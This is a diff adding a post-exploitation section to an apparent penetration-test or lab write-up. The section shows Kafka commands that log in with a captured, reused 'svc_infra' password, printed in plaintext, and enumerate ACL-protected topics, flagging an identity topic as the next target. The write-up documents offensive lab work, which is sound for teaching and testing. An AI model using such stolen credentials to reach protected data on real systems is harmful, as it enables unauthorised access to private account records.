@@ -1098,6 +1098,53 @@ Key finding: a shell as `svc-infra`, confirming the Kafka SASL password is reuse
 <div style="page-break-after: always;"></div>
 
 ## 4. Post-Exploitation
+
+### 4.1 Authenticated Kafka Topic Enumeration
+
+As the `svc_infra` principal, compare the anonymous topic list against the authenticated one. Topics protected by an ACL are invisible to anonymous clients and appear only once you log in, which is a reliable way to surface hidden data stores.
+
+**Command:**
+
+```bash
+# anonymous view on the plaintext listener
+/opt/kafka_2.13-4.3.1/bin/kafka-topics.sh --bootstrap-server 127.0.0.1:9092 --list
+
+# authenticated view on the SASL listener
+cat > /tmp/kc.properties <<'EOF'
+security.protocol=SASL_PLAINTEXT
+sasl.mechanism=PLAIN
+sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="svc_infra" password="Ny2hdpme$bwT3";
+EOF
+
+/opt/kafka_2.13-4.3.1/bin/kafka-topics.sh --bootstrap-server 127.0.0.1:9094 --command-config /tmp/kc.properties --list
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `kafka-topics.sh --bootstrap-server 127.0.0.1:9092 --list` | Anonymous list | Lists topics over the plaintext listener with no credentials. |
+| `/tmp/kc.properties` | Client auth config | Supplies the SASL PLAIN login for `svc_infra` so the client can authenticate. |
+| `--bootstrap-server 127.0.0.1:9094 --command-config /tmp/kc.properties --list` | Authenticated list | Lists topics over the SASL listener as `svc_infra`, revealing ACL-protected topics. |
+
+**Result:**
+
+```shell
+# anonymous (:9092)
+__consumer_offsets
+aidx.flightleg.dlq.v1
+aidx.flightleg.json.v1
+aidx.flightleg.raw.v1
+
+# authenticated (:9094)
+__consumer_offsets
+aidx.flightleg.dlq.v1
+aidx.flightleg.json.v1
+aidx.flightleg.raw.v1
+aidx.identity.json.v1
+```
+
+Key finding: `aidx.identity.json.v1` is visible only to the authenticated principal, an ACL-protected topic hidden from anonymous clients. Its name points to account records, making it the next thing to consume.
 <div align="center">
 <br>
 <br>
